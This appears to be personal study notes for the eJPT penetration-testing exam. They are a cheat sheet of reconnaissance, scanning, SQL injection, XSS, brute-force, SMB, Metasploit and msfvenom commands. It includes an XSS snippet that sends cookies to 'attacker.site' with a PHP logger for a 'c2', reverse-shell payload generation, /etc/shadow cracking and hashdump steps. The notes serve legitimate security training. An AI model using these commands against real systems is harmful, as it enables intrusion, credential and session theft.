# Some notes for the eJPT exam

Those notes are based on the eJPT course from eLearnSecurity

* * *

### Networking

#### Check routing table information

Linux

```
route -n
```

Windows

```
route print
```

OSX

```
netstat -r
```

#### Add a new route to the route table

The ROUTEFROM is the IP address shown as your gatewar in the route table.  
The ROUTETO is the IP range with CIDR

```
ip route add ROUTETO via ROUTEFROM
```

**Examples:**

```
$ ip route add 192.168.10.0/24 via 10.175.3.1
$ route add -net 192.168.10.0 netmask 255.255.255.0 gw 10.175.3.1
```

#### DNS

```
$ nslookup mysite.com
$ dig mysite.com
```

* * *

## Information Gathering

### Whois

```
whois website.tld
```

### Subdomain Enumeration

**DNS Dumpster**  
[https://www.dnsdumpster.com](https://www.dnsdumpster.com)

**sublist3r**

```
sublist3r -d domain.tld
```

* * *

## Footprinting & Scanning

### PING SWEEP

#### FPING

fping is a program to send ICMP echo probes to network hosts, similar to ping, but much better performing when pinging multiple hosts.

`-a`,`--alive` show targets that are alive  
`-g`,`--generate` generate target list

```
fping IP/CIDR -ag 2> /dev/null
```

#### NMAP

```
nmap -sn IP/CIDR
```

* * *

### Working with NMAP (PORT SCANNING)

Some usfeul flags for nmap

```
-sS: TCP SYN Scan (aka Stealth Scan)
-sT: TCP Connect Scan 
-sU: UDP Scan
-sn: Ping sweep
-sV: Service Version information
-O: Operating System information
-T1-5: Speed, default T3
```

#### OS Detection

```
nmap -O IP-ADDRESS
```

#### Quick scan

```
nmap -sC -sV IP-ADDRESS
```

#### Extensive (Full) scan

```
nmap -sC -sV -p- IP-ADDRESS
```

#### Spotting a Firewall

If an nmap TCP scan identified a well-known service, such as a web server, but cannot detect the version, then there may be a firewall in place.

For example:

```
PORT    STATE  SERVICE  REASON          VERSION
80/tcp  open   http?    syn-ack ttl 64
```

Another example:

```
80/tcp  open   tcpwrapped
```

"tcpwrapped" means the TCP handshake was completed, but the remote host closed the connection without receiving any data.

These are both indicators that a firewall is blocking our scan with the target!

Tips:

- Use `--reason` to see why a port is marked open or closed
- If a "RST" packet is received, then something prevented the connection - probably a firewall!


### NMAP Scripts

```--script=``` Can be used to run some scripts like FTP or SMB or vuln
NMAP Scripts can be found here: ```/usr/share/nmap/scripts```

**Examples:**
*FTP*
~~~
nmap -sV -O --script=ftp* -p21 -T5 $IP
~~~
*SMB*
~~~
nmap -sV -O --script=smb* -T5 $IP
~~~



* * *

## Web attacks (web applications)

This paragraph can be used to enumerate and attack webservices during an exercise

**Turn on Burp Suite** to intercept all web traffic. In the headers there might be some interesting information.

* * *

### Banner grabbing HTTP

##### Netcat

```
nc -v IP-ADDRESS PORT
HEAD / HTTP/1.0


```

Don't forget to hit the ENTER key TWICE.

Use the OPTIONS verb to see what other verbs are available

```
nc 10.10.10.10 80
OPTIONS / HTPP/1.0


```

Possible HTTP VERBS  
GET, POST, HEAD, PUT, DELETE, OPTIONS, TRACE

You can use HTTP verbs to upload a php shell. Find the content length, then use PUT to upload the shell. Make sure you include the size of the payload when using the PUT command.

```
wc -m shell.php
x shell.php

PUT /shell.php
Content-type: text/html
Content-length: x
<?php phpinfo(); ?>
```

### Banner grabbing HTTPS

```
openssl s_client -connect <machine IP>:PORT
HEAD / HTTP/1.0
```

* * *

### Nikto

Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items

```
nikto -h http://hostname
```

* * *

### WhatWeb

WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.

```
whatweb http://hostname
```

* * *

### Directory Enumeration

**Suggested extensions**

- bak
- old
- xxx
- txt
- php
- html

**Suggested lists**

`/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt`  
`/usr/share/seclists/Discovery/Web-Content/quickhits.txt`  
`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

#### DIRB

```
dirb http://HOSTNAME
```

#### DIRBUSTER

1.  Set the target
2.  Set Threads to 20
3.  Select the wordlist
4.  Enter the DIR to start with
5.  Enter the file extensions which should be included
6.  Press Start


![Alt text](/Images/dirbuster.png "Dirbuster")

#### GOBUSTER

```
gobuster -u IP-ADDRESS -w /path/to/wordlist.txt
gobuster dir -u <URL> -w <WORDLIST> -t <THREADS>
gobuster dir -u http://website/tld -w /usr/usr/wordlists/dirb/common.txt
gobuster dir -u http://$ip/ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://website.tld -w /usr/usr/wordlists/dirb/common.txt -x php 
```

* * *

### Robots.txt

Don't forget to check if a robots.txt file is present. Check if these files and directories are accessible.

* * *

### View SOURCE CODE

Sometimes developers are lazy and they did not remove comments. Those comments could be useful as attacker.

In the browser press `CTRL` \+ `U` to view the source of the web page.  
Or right click on the mouse and press "view source". Another useful tool within the browser is the "Developer tools" add-on, this can be activated via the `F12` key.

* * *

### SQL Injection

`'`, `"` are used as string terminators  
`#`, `--` are used for comments  
`SELECT`, `UNION` are SQL commands

**Boolean based SQL Injections**  
`' OR 'a'='a` = true  
`' OR '1'='1` = true  
`' OR '1'='2` = false  
`and 1=1; -- -`  
`and 1=2; -- -`

**Examples**  
`' OR 'a'='a`  
`' UNION SELECT Column1, Column2 FROM Table WHERE 'a'=a`  
`' UNION SELECT user(); -- -';`

#### SQLMap

- `-u` is used for the URL
- `-p` is used as injection parameter
- `-d`
- `-t`
- `-c`
- `--database`
- `--tables`
- `--columns`
- `--dump`

**Example:**  
`sqlmap -u 'http://website.tld/view.php?id=1141' -p id --technique=U`

#### GET request

```
sqlmap -u http://IP-ADDRESS
```

#### POST request

```
sqlmap -u <URL> --data=<POST string> -p parameter [options]
```

Check if injection exists

sqlmap -r Post.req  
sqlmap -u "[http://10.10.10.10/file.php?id=1](http://10.10.10.10/file.php?id=1)" -p id #GET Method  
sqlmap -u "[http://10.10.10.10/login.php](http://10.10.10.10/login.php)" --data="user=admin&password=admin" #POST Method

Get database if injection Exists

sqlmap -r login.req --dbs  
sqlmap -u "[http://10.10.10.10/file.php?id=1](http://10.10.10.10/file.php?id=1)" -p id --dbs #GET Method  
sqlmap -u "[http://10.10.10.10/login.php](http://10.10.10.10/login.php)" --data="user=admin&password=admin" --dbs #POST Method

Get Tables in a Database

sqlmap -r login.req -D dbname --tables  
sqlmap -u "[http://10.10.10.10/file.php?id=1](http://10.10.10.10/file.php?id=1)" -p id -D dbname --tables #GET Method  
sqlmap -u "[http://10.10.10.10/login.php](http://10.10.10.10/login.php)" --data="user=admin&password=admin" -D dbname --tables #POST Method

Get data in a Database tables

sqlmap -r login.req -D dbname -T table_name --dump  
sqlmap -u "[http://10.10.10.10/file.php?id=1](http://10.10.10.10/file.php?id=1)" -p id -D dbname -T table_name --dump #GET Method  
sqlmap -u "[http://10.10.10.10/login.php](http://10.10.10.10/login.php)" --data="user=admin&password=admin" -D dbname -T table_name --dump #POST Method

* * *

### Cross Site Scripting (XSS)

The general steps I use to find and test XSS are as follows:

1.  List item
2.  Find a reflection point
3.  Test with tag
4.  Test with HTML/JavaScript code (alert('XSS'))

Some harmless tags that could be used to identify XSS  
`<i>Text</i>`  
`<b>Text</b>`  
`<pre>Text</pre>`  
`<plaintext>Text</plaintext>`

To test the XSS, inject some HTML/Javasctipt  
`<script>alert('XSS')</script>`

Reflected XSS = Payload is carried inside the request the victim sends to the website. Typically the link contains the malicious payload  
Persistent XSS = Payload remains in the site that multiple users can fall victim to. Typically embedded via a form or forum post

#### XSS: stealing cookie content and sending it to an attacker

XSS to insert on target:

```
<script>
var i = new Image();
i.src="http://attacker.site/log.php?q="+document.cookie; 
</script>
```

PHP script to store captured data on our c2:

```
<?PHP
$filename="/tmp/log.txt"; // Where to save, this file should be already created on our c2
$fp=fopen($filename, 'a'); 
$cookie=$_GET['q']; // the parameter to store the cookies/ whatever command we need into
fwrite($fp, $cookie);
fclose($fp);
?>
```

#### XSSer

Cross Site “Scripter” (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications.

`--url` is used for the target URL  
`-g` is used to perform XSS sending payload using GET (ex: '/menu.php?id=XSS')  
`-p` is used to perform XSS sending payload using POST (ex: 'foo=1&bar=XSS')  
`--auto` Inject a list of vectors provided by XSSer  
`--Fp` Exploit your own code (FINALPAYLOAD)

Example of XSSer with POST payload

```
xsser --url 'http://website.tld/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
```

Example of XSSer with GET payload

```
xsser --url "http://website.tld/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote"
```

Example of XSSer with GET payload in coimbination with own code

```
xsser --url "http://website.tld/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"
```

The final attack can bec opied and shared or used via Burp Suite

Example of generated "Final Attack:"

```
http://website.tld/index.php?page=user-poll.php&csrf-token=&choice=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&initials=d&user-poll-php-submit-button=Submit+Vote
```

* * *

## System attacks

### Password Attacks

#### John the Ripper

```
john -wordlist /path/to/wordlist -users=users.txt hashfile
```

#### Hashcat

* * *

### Unshadow (/etc/passwd & etc/shadow)

First use the unshadow command to combines the /etc/passwd and /etc/shadow files so John can use them.

```
unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db
```

As soon as the unshadow command is finished, the output is ready to be used with John the Ripper.

```
john /tmp/crack.password.db
```

### MySQL

**Remotely**

```
mysql -u <user> -p<password> -h <IP> -D <dbname>
```

**locally**

```
mysql -u <user> -p<password>
```

Some useful commands:  
`show databases;`  
`use database <database name>;`  
`show tables;`  
`show columns from <table name>;`  
`SELECT user();`  
`SELECT @@version;`

Sometimes MySQL is runned as privileged user. To perform system commands or get a shell try this: `\! sh`

* * *

## Network attacks

### Hydra - brute force attack

Hydra can be used to brute force for an username and password on a service running on the target.

- `-l` used for single username
- `-L` used for list of usernames
- `-p` used for single password
- `-P` used for list of passwords

#### FTP

```
hydra ftp://IP-ADDRESS -L usernames.txt -P passwords.txt
```

#### SSH

```
hydra ssh://IP-ADDRESS -L usernames.txt -P passwords.txt
```

#### Telnet

```
hydra -L users.txt -P passwd.txt telnet://IP-ADDRESS
```

### Windows Shares

### Null Sessions

### ARP Spoofing

* * *

## SMB Enumeration

Port 139,445 - Pentesting SMB

`<00>` \- Means that this machine is a CLIENT  
`<20>` \- Means file sharing is enabled on that machine. Enumerate it further, this is of most importance.

enum4linux

```
enum4linux -a IP-ADDRESS
```

nmblookup

~~~
nmblookup -A $ip
~~~

### SMB Null Attack

`-L` List all files  
`-N` No password

**List all shares without password**

```
smbclient -N -L //$ip
```

**Connect to SMB share without password**

```
smbclient //IP-ADDRESS/share-name -N
```

**List SMB sharse for specific username**
~~~
smbclient -L $ip -U Administrator
~~~


* * *

## Metasploit

To start metasploit without a banner

```
msfconsole -q
```

Some basic Metasploit commands

- search
- use
- show options
- set VARIABLE value
- exploit or run

### Meterpreter

The below are some handy commands for use with a Meterpreter session. Again, I’d recommend going through a Metasploitable or doing some extra study here.

Set the current process in the background
~~~
background 
~~~
List all active sessions
~~~
msf6 > sessions -l  
~~~
Start a session which is identified by a number
~~~
msf6 > sessions -i 1  
~~~


 getuid  
getsystem (privesc)  
bypassuac  
download x /root/  
upload x C:\\Windows

use post/windows/gather/hashdump

Upgrade to a full shell in meterpreter
```
meterpreter > shell
```

Get the system information via meterpreter
```
meterpreter > sysinfo
```

Get User information via meterpreter
```
meterpreter > getuid
```

Show the network configuration via meterpreter
```
meterpreter > ifconfig
```

Show the route table via meterpreter
~~~
meterpreter > route
~~~

Port foward using meterpreter
```
portfwd add -l 2222 -p 22 -r 172.16.50.222
```

Autoroute
```
run autoroute -s 10.10.10.0/24
```

* * *

## msfvenom

Msfvenom is a command line instance of Metasploit that is used to generate and output all of the various types of shell code that are available in Metasploit.

WAR - Tomcat Apache

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR-IP-ADDRESS LPORT=YOUR-PORT -f war > shell.war
```

JSP Java Meterpreter Reverse TCP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR-IP-ADDRESS LPORT=YOUR-PORT -f raw > shell.jsp
```

PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=YOUR-IP-ADDRESS LPORT=YOUR-PORT -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

* * *

## Windows Command Line

**To search for a file starting from current directory**

```
dir /b/s "*.conf*"
dir /b/s "*.txt*"
dir /b/s "*filename*"
```

**Check routing table**

```
route print
netstat -r
```

**Check Users**

```
net users
```

**List drives on the machine**

```
wmic logicaldisk get Caption,Description,providername
```

* * *

## Post exploitation

- [ ] Check user permissions
- [ ] Check home directories users
- [ ] Check (bash) history
- [ ] Check /etc/passwd
- [ ] Check /etc/shadow
- [ ] Check network interfaces
- [ ] Check running services
- [ ] Check open ports
- [ ] Check Operating System version
- [ ] Check kernel
- [ ] Check SUID
- [ ] Check Cron job
- [ ] Check configuration files
	- [ ] Usernames
	- [ ] Passwords
- [ ] Check host file
- [ ] Check tmp folder
- [ ] LinPEAS
- [ ] Lin4Enum
- [ ] WinPEAS


### Upgrade shell
~~~
python -c 'import pty;pty.spawn("/bin/bash")'
~~~


* * *

## Users list, Passwords list, Directory list and Scripts

**user list:**  
`/usr/share/ncrack/minimal.usr`

**Passwords list(s):**  
`/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt`  
`/usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt`  
`/usr/share/wordlists/rockyou.txt`

**Directory enumeration list(s):**  
`/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt`  
`/usr/share/seclists/Discovery/Web-Content/quickhits.txt`  
`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

**nmap scripts:**  
`/usr/share/nmap/scripts`

* * *

## Other useful stuff
A website to generate a reverse shell in all kind of languages: https://www.revshells.com/

* * *

